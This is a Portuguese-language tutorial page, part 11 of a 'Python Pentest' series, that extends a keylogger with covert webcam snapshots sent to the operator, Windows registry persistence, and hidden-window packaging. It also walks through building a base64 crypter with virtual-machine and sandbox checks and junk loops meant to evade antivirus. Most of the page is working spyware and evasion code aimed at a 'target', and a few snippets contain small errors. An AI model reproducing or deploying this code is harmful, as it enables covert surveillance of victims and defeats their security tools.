<!DOCTYPE html>
<html lang="pt-br">
    <head>
        <meta charset="UTF-8"/>
        <link rel="icon" href="imagens/favicon.ico"/>
        <title>Aprenda Python Pentest</title>
        <link rel="stylesheet" href="css/estilo.css"/>
    </head>
    <body>
        <div>
            <header>
                <h1>Aprenda Python Pentest</h1>
                <menu>
                    <li><a href="index.html">Página Inicial</a></li>
                    <li><a href="contato.html">Contato!</a></li>
                    <li><a href="tudo-sobre-python-pentest-1.html">Tudo sobre Python Pentest Parte 1!</a></li>
                    <li><a href="tudo-sobre-python-pentest-2.html">Tudo sobre Python Pentest Parte 2!</a></li>
                    <li><a href="tudo-sobre-python-pentest-3.html">Tudo sobre Python Pentest Parte 3!</a></li>
                    <li><a href="tudo-sobre-python-pentest-4.html">Tudo sobre Python Pentest Parte 4!</a></li>
                    <li><a href="tudo-sobre-python-pentest-5.html">Tudo sobre Python Pentest Parte 5!</a></li>
                    <li><a href="tudo-sobre-python-pentest-6.html">Tudo sobre Python Pentest Parte 6!</a></li>
                    <li><a href="tudo-sobre-python-pentest-7.html">Tudo sobre Python Pentest Parte 7!</a></li>
                    <li><a href="tudo-sobre-python-pentest-8.html">Tudo sobre Python Pentest Parte 8!</a></li>
                    <li><a href="tudo-sobre-python-pentest-9.html">Tudo sobre Python Pentest Parte 9!</a></li>
                    <li><a href="tudo-sobre-python-pentest-10.html">Tudo sobre Python Pentest Parte 10!</a></li>
                    <li><a href="tudo-sobre-python-pentest-11.html" onclick="alert('Você já Está na Matéria desse Link!'); return false">Tudo sobre Python Pentest Parte 11!</a></li>
                    <li><a href="tudo-sobre-python-pentest-12.html">Tudo sobre Python Pentest Parte 12!</a></li>
                    <li><a href="tudo-sobre-python-pentest-13.html">Tudo sobre Python Pentest Parte 13!</a></li>
                </menu>
            </header>
           
<h2>Tudo sobre Python Pentest Parte 11</h2>

<h3>Capturando uma Foto da Câmera</h3>

<p>Pra tirar uma foto da webcam com o Python, primeiramente, vamos instalar a biblioteca <code>opencv-python</code>. Num arquivo de teste podemos fazer assim, de forma simples:</p>

<pre>
<code>
import cv2

cam = cv2.VideoCapture(0)

if not cam.isOpened():
    print("Erro ao abrir a câmera!")
else:
    sucess, rawData = cam.read()

    if sucess:
        sucess, data = cv2.imencode(".jpg", rawData)

        if sucess:
            imageData = data.tobytes()

            with open("foto-webcam.jpg", "wb") as arqCam:
                arqCam.write(imageData)
        else:
            print("Erro ao codificar a imagem!")
    else:
        print("Erro ao capturar a imagem!")

cam.release()
</code>
</pre>

<p>As câmeras são contadas a partir do 0 (a padrão), geralmente PCs de mesa não costumam ter webcam, os notebooks tem uma só por padrão.</p>

<p>PS: Algumas câmeras tem luz que liga ao tirar a imagem, por isso pode chamar a atenção do alvo, isso é controlado pelos firmwares da própria câmera.</p>

<p>Daí, pra incluir isso no keylogger, basta definir essa função:</p>

<pre>
<code>
def camShot(sock):
    cam = cv2.VideoCapture(0) # Import cv2

    if not cam.isOpened():
        sendData("alerta", "Erro ao abrir a câmera!", sock)
    else:
        sucess, rawData = cam.read()

        if sucess:
            sucess, data = cv2.imencode(".jpg", rawData)

            if sucess:
                date = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")  # Importe datetime
                fileName = f"webcam-{date}.jpg"
                imageData = data.tobytes()
                
                sendFile(fileName, imageData, sock)
            else:
                sendData("alerta", "Erro ao codificar a imagem!", sock)
        else:
            sendData("alerta", "Erro ao capturar a imagem!", sock)

    cam.release()
</code>
</pre>

<p>E no recvData do keylogger, basta adicionar esse elif abaixo do elif de screenshot:</p>

<pre>
<code>
elif comando == "webcam":
    camShot(sock)
</code>
</pre>

<h3>Implementando Autorun</h3>

<p>O autorun é pra garantir que, quando o alvo reiniciar o Windows, nosso script continue funcionando. Para isso, usaremos a biblioteca <code>winreg</code>. No caso, ao executar pela primeira vez, ele enviará o nosso script para um diretório pouco mexido, como o Temp, e adicionará uma entrada no registro do Windows.</p>

<p>Faça um arquivo de teste com esse código:</p>

<pre>
<code>
import os
import tempfile

scriptPath = os.path.realpath(__file__) # Autoreferência ao script no caminho atual
tempPath = tempfile.gettempdir() # Pasta temporária

print(scriptPath)
print(tempPath)
</code>
</pre>

<p>Daí pra copiar o script pro Temp, fazemos assim:</p>

<pre>
<code>
import os
import shutil
import tempfile

scriptPath = os.path.realpath(__file__) # Autoreferência ao script no caminho atual
tempPath = tempfile.gettempdir() # Pasta temporária

shutil.copy(scriptPath, tempPath)
</code>
</pre>

<p>Só que ele dará erro ao executar quando ele já estiver na Temp, então devemos fazer o tratamento no shutil assim:</p>

<pre>
<code>
try:
    shutil.copy(scriptPath, tempPath)
except shutil.SameFileError:
    pass
</code>
</pre>

<p>Daí, pra adicionar chaves do registro, basicamente fazemos assim:</p>

<pre>
<code>
import os
import shutil
import tempfile
import winreg

scriptPath = os.path.realpath(__file__) # Autoreferência ao script no caminho atual
tempPath = tempfile.gettempdir() # Pasta temporária
caminho = os.path.join(tempPath, os.path.basename(scriptPath))

try:
    shutil.copy(scriptPath, tempPath)

    subChave = r"Software\Microsoft\Windows\CurrentVersion\Run" # O r anula todos os caracteres especiais, dispensando a barra invertida dupla
    nome = "MeuScriptTeste"
    registro = winreg.OpenKey(winreg.HKEY_CURRENT_USER, subChave, 0, winreg.KEY_SET_VALUE)

    winreg.SetValueEx(registro, nome, 0, winreg.REG_SZ, caminho)
except shutil.SameFileError:
    pass
</code>
</pre>

<p>Só que, ao empacotar o Python num exe, ele poderá dar problemas. Para compilar, instale o <code>pyinstaller</code> através do pip, depois pelo CMD, digite <code>pyinstaller -F Teste.py</code>. Ele gerará um executável, no entanto, ele não conseguirá colocar um script com extensão py pro Temp, já que a biblioteca os só pega o script Python. Para isso, altere a linha do scriptPath assim:</p>

<pre>
<code>
if getattr(sys, "frozen", False): # Verifica se ele está congelado num exe, importe sys
    scriptPath = os.path.realpath(sys.executable)
else:
    scriptPath = os.path.realpath(__file__)
</code>
</pre>

<p>Daí, no keylogger, basta colocar essa função:</p>

<pre>
<code>
# Importe sys, tempfile, shutil e winreg
def autoRun():
    if getattr(sys, "frozen", False):  # Verifica se ele está congelado num exe
        scriptPath = os.path.realpath(sys.executable)
    else:
        scriptPath = os.path.realpath(__file__)  # Autoreferência ao script no caminho atual

    tempPath = tempfile.gettempdir()  # Pasta temporária
    caminho = os.path.join(tempPath, os.path.basename(scriptPath))

    try:
        shutil.copy(scriptPath, tempPath)

        subChave = r"Software\Microsoft\Windows\CurrentVersion\Run"  # O r anula todos os caracteres especiais
        nome = "Inicio"
        registro = winreg.OpenKey(winreg.HKEY_CURRENT_USER, subChave, 0, winreg.KEY_SET_VALUE)

        winreg.SetValueEx(registro, nome, 0, winreg.REG_SZ, caminho)
    except shutil.SameFileError:
        pass
</code>
</pre>

<p>Daí, podemos colocar a invocação da função autoRun no final do script, antes do While True:</p>

<pre>
<code>
autoRun()

while True:
    sock = tentarConec()

    recvData(sock)
</code>
</pre>

<h3>Entendendo os Antivírus</h3>

<p>Os antivírus conseguem identificar facilmente nossos programas criados com o Python, até porque ele analisa diretamente o código-fonte dos mesmos. Podemos criar um executável com os scripts Python empacotados. Podemos colocar nossos scripts ou mesmo os executáveis no site Vírus Total pra ver quantos e quais antivírus detectam ele.</p>

<p>Outras formas que os antivírus usam pra detectar malwares, é comparar a assinatura dos arquivos com as assinaturas de malwares que estão no banco de dados dos mesmos.</p>

<p>Os antivírus modernos já utilizam a análise comportamental dos arquivos (como ver se ele adiciona determinadas chaves no registro ou criptografa arquivos), essa é a análise estática.</p>

<p>Já a análise dinâmica analisa o que o malware faz em tempo de execução (ou seja, monitora a execução dos mesmos), mas isso, apesar de eficiente, consome muitos recursos do computador, por isso eles usam um meio-termo entre os dois.</p>

<p>Muitos antivírus modernos, no entanto, usam uma IA para analisar os malwares.</p>

<p>Podemos usar ofuscadores para <q>mascarar</q> nossos malwares, isso veremos mais pra frente.</p>

<h3>Criando um Ofuscador</h3>

<p>Podemos criar um crypter para que um antívirus, bot ou coisa parecida não analise nosso malware, pois este ofusca nosso malware de forma que ele seja injetado diretamente na memória.</p>

<p>Vamos supor esse programa de teste:</p>

<pre>
<code>
d = """
print('Teste')
"""

exec(d)
</code>
</pre>

<p>No caso, a função exec executa tudo que está na string atribuída à variável d, no caso, o print com a string <q>Teste</q>.</p>

<p>Uma outra forma muito utilizada é carregar nosso executável dentro do código, codificando o exe dele num código dentro do script Python. Dessa forma, mesmo ele sendo detectado, ele já estará executando o código.</p>

<p>PS: No nosso keylogger, remova todos os prints para nada ser exibido pro alvo.</p>

<p>Para empacotar nosso keylogger, utilize <code>pyinstaller -F -w Keylogger.py</code>. A opção -w é pra ele não executar nenhum console, pra que não chame a atenção do alvo. Claro que ele aparecerá no gerenciador de tarefas normalmente, apenas não será exibido nenhum prompt ou coisa parecida. Podemos também especificar um ícone com a opção <q>-i</q>, como <code>-i nomedoicone.ico</code>.</p>

<p>Podemos carregar nosso exe, num código num novo arquivo (como Cripter.py) como esse:</p>

<pre>
<code>
import sys

with open(sys.argv[1], "rb") as arqExe:
    print(arqExe.read())
</code>
</pre>

<p>Daí, é só passar o executável como argumento, no formato <code>python Cripter.py Keylogger.exe</code>.</p>

<p>Deixe depois o mesmo código assim:</p>

<pre>
<code>
import sys
import base64

with open(sys.argv[1], "rb") as arqExe:
    encCode = base64.b64encode(arqExe.read())

rawCode = f"""
encCode = {encCode}
"""

with open("codigo.py", "w") as arqCod:
    arqCod.write(rawCode)

os.chmod("codigo.py", 0o777)
</code>
</pre>

<p>Aí, altere o rawCode assim:</p>

<pre>
<code>
rawCode = f"""
import base64

encCode = {encCode}

with open("code.exe", "wb") as arqExe:
    arqExe.write(base64.b64decode(encCode))
"""
</code>
</pre>

<p>E depois assim (instale o <code>psutil</code> primeiro):</p>

<pre>
<code>
rawCode = f"""
import base64
import psutil

encCode = {encCode}

with open("code.exe", "wb") as arqExe:
    arqExe.write(base64.b64decode(encCode))
    
process = psutil.Popen("code.exe")

while process.is_running():
    pass
"""
</code>
</pre>

<p>Dentro do rawCode, deixe assim:</p>

<pre>
<code>
rawCode = f"""
import base64
import psutil

def criarProc():
    process = psutil.Popen("code.exe")
    
    while process.is_running():
        pass
        
def filed():
    encCode = {encCode}
    
    return base64.b64decode(encCode)

def saveFile():
    with open("code.exe", "wb") as arqExe:
        arqExe.write(filed())
        
saveFile()
criarProc()
"""
</code>
</pre>

<p>Pode ser que assim, seja mais difícil (não impossível) de alguns antivírus o pegar. Fique de olho com comentários com caracteres unicode, pois podem dar erro ao gerar o script.</p>

<p>Podemos fazer uma verificação se ele está sendo executando numa máquina virtual, como verificando a memória do mesmo, já que as VM tem memória e CPUs reduzidas, em contraste com um sistema <q>principal</q>. O mesmo vale pra sandbox de antivírus, que criam um ambiente distinto pra testar os programas pra ver se tem malwares.</p>

<p>Pra pegar as CPUs físicas e lógicas, fazemos assim, num arquivo de teste:</p>

<pre>
<code>
import psutil

fCpu = psutil.cpu_count(logical = False) # CPUs físicas
lCpu = psutil.cpu_count(logical = True) # CPUs lógicas
cpu = fCpu + lCpu

print(fCpu)
print(lCpu)
</code>
</pre>

<p>No exemplo, ele pode retornar, por exemplo, duas CPUs físicas e duas lógicas, totalizando 4 CPUs.</p>

<p>Pra pegar a memória, fazemos assim:</p>

<pre>
<code>
memTot = psutil.virtual_memory().total
mem = memTot / (1024 ** 2) # Convertendo o valor de B pra MB

print(mem)
</code>
</pre>

<p>E pra verificar se é ou não máquina virtual:</p>

<pre>
<code>
import psutil

fCpu = psutil.cpu_count(logical = False) # CPUs físicas
lCpu = psutil.cpu_count(logical = True) # CPUs lógicas
cpu = fCpu + lCpu

memTot = psutil.virtual_memory().total
mem = memTot / (1024 ** 2) # Convertendo o valor de B pra MB

if mem > 8000 and cpu >= 4:
    print("Não é Máquina Virtual!")
else:
    print("É Máquina Virtual!")
</code>
</pre>

<p>Daí, dentro das aspas de rawCode do Cripter, coloque isso no lugar da invocação das funções:</p>

<pre>
<code>
fCpu = psutil.cpu_count(logical = False) # CPUs físicas
lCpu = psutil.cpu_count(logical = True) # CPUs lógicas
cpu = fCpu + lCpu

memTot = psutil.virtual_memory().total
mem = memTot / (1024 ** 2) # Convertendo o valor de B pra MB

if mem > 8000 and cpu >= 4:
    saveFile()
    criarProc()
else:
    exit()
</code>
</pre>

<p>Daí, é só compilar o código Python gerado (como no caso, codigo.py).</p>

<p>Pra dificultar a detecção de antivírus, podemos colocar o método filed assim:</p>

<pre>
<code>
def filed():
    for i in range(65536):
        if i == False
            continue

    # O restante deixa igual
</code>
</pre>

<p>E o if e else abaixo, deixe assim:</p>

<pre>
<code>
if mem > 8000 and cpu >= 4:
    saveFile()
    criarProc()
else:
    for i in range(65536):
        if i > 1024:
            exit()
</code>
</pre>

<p>Isso é pra que um antivírus fique <q>confuso</q> ao tentar analisar o script, por não entender direito o que ele faz.</p>

<p>Pra dividir um código base64, podemos fazer assim, num arquivo de teste:</p>

<pre>
<code>
import base64
import math

with open("Keylogger.py", "r") as arqKey:
    encCode = base64.b64encode(arqKey.read()).decode()

    print(math.floor(len(encCode) / 2))
</code>
</pre>

<p>Fazendo o mesmo com os executáveis:</p>

<pre>
<code>
import base64
import math

with open("Keylogger.exe", "rb") as arqKey:
    encCode = base64.b64encode(arqKey.read()).decode()

    metade = math.floor(len(encCode) / 2)

    p1 = encCode[:metade]
    p2 = encCode[metade:]

junto = p1 + p2

with open("code.exe", "wb") as arqCod:
    arqCod.write(base64.b64decode(junto))
</code>
</pre>

<p>E aí, no Cripter, deixe o primeiro with open assim:</p>

<pre>
<code>
with open(sys.argv[1], "rb") as arqExe:
    encCode = base64.b64encode(arqExe.read()).decode()
    metade = math.floor(len(encCode) / 2)

    p1 = encCode[:metade]
    p2 = encCode[metade:]
</code>
</pre>

<p>E deixe o método filed assim:</p>

<pre>
<code>
def filed():
    p2 = {p2}
    
    for i in range(65536):
        if i == False:
            continue
            
    p1 = {p1} # p1 e p2 estão separados propositalmente
    x = 1
    
    while x < 30: # Mais um while pra confundir os antivírus
        x += 1
    
    junto = p1 + p2
    
    return base64.b64decode(junto)
</code>
</pre>

<ul>
    <li><a href="tudo-sobre-python-pentest-10.html">Parte Anterior da Matéria!</a></li>
    <li><a href="tudo-sobre-python-pentest-12.html">Continuação da Matéria!</a></li>
</ul>

        </div>
    </body>
</html>